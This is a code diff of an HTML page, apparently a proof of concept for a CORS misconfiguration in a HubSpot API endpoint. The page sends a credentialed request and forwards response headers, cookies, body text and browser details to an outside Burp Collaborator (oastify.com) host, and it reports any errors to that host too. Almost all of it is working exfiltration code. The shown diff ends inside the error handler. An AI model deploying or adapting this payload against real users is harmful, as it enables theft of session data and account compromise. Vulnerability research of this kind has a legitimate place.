@@ -1,89 +1,105 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit - Get Cookies</title>
+    <title>CORS Exploit - Get HubSpot Cookies</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Loading... Please wait</h1>
+    <div id="status">Sending request...</div>
     <script>
     (function() {
-        // 1. First, send request to HubSpot with credentials
+        // Send correct request to HubSpot API
         fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
             method: 'POST',
-            credentials: 'include',
+            credentials: 'include',  // IMPORTANT: This sends cookies
             headers: {
                 'Content-Type': 'application/json',
-                'X-Requested-With': 'XMLHttpRequest'
+                'Accept': 'application/json'
+                // Don't set Origin manually - browser handles it
             },
             body: JSON.stringify([{
                 event: 'page_view',
                 properties: {
-                    url: window.location.href,
-                    timestamp: new Date().toISOString()
+                    url: 'https://example.com',
+                    timestamp: new Date().toISOString(),
+                    // Add required fields to avoid 400 error
+                    app: 'hubspot',
+                    screen: 'test',
+                    accountId: 'test'
                 }
             }])
         })
         .then(response => {
-            // Get Set-Cookie headers from response
-            var setCookieHeaders = response.headers.get('Set-Cookie') || 'No Set-Cookie header';
+            // Get the response including any Set-Cookie headers
+            var setCookie = response.headers.get('Set-Cookie') || 'No Set-Cookie header';
             
-            // Get all response headers
-            var allHeaders = {};
+            // Get all headers
+            var headers = {};
             response.headers.forEach((value, key) => {
-                allHeaders[key] = value;
+                headers[key] = value;
             });
             
             return response.text().then(data => {
                 return {
                     status: response.status,
                     statusText: response.statusText,
-                    data: data,
-                    setCookie: setCookieHeaders,
-                    allHeaders: allHeaders,
-                    url: response.url
+                    headers: headers,
+                    setCookie: setCookie,
+                    body: data,
+                    url: response.url,
+                    // Try to get cookies from document (if any)
+                    documentCookies: document.cookie || 'No document.cookie'
                 };
             });
         })
         .then(result => {
-            // Try to get cookies from document (if any non-HttpOnly exist)
-            var docCookies = document.cookie || "No document.cookie (all HttpOnly)";
-            
-            // Get all cookies from document.cookie and also try to extract from response
+            // Send everything to Collaborator
             var payload = {
-                doc_cookies: docCookies,
-                set_cookie_header: result.setCookie,
-                all_response_headers: result.allHeaders,
-                response_status: result.status,
-                response_data: result.data.substring(0, 500), // First 500 chars
-                response_url: result.url,
-                origin: window.location.origin,
-                userAgent: navigator.userAgent,
-                referrer: document.referrer || 'No referrer',
+                type: 'CORS_Exploit_Result',
+                result: result,
+                // Also include any cookies we can access
+                cookies_from_document: document.cookie || 'No cookies accessible',
+                // Include browser info
+                browser_info: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled
+                },
                 timestamp: new Date().toISOString(),
-                note: "HttpOnly cookies cannot be read by JavaScript. They are only sent automatically in requests."
+                origin: window.location.origin,
+                href: window.location.href
             };
             
             // Send to Collaborator
             return fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify(payload)
             });
         })
         .then(() => {
-            console.log('[+] Data sent to Collaborator!');
+            document.getElementById('status').innerHTML = '✅ Data sent to Collaborator! Check your logs.';
+            console.log('[+] Success!');
         })
         .catch(error => {
-            console.log('[-] Error:', error);
+            document.getElementById('status').innerHTML = '❌ Error: ' + error.toString();
+            console.error('[-] Error:', error);
+            
+            // Send error to Collaborator
             fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
+                    type: 'ERROR',
                     error: error.toString(),
-                    errorStack: error.stack,
-                    origin: window.location.origin,
+                    stack: error.stack,
                     timestamp: new Date().toISOString()
                 })
             });
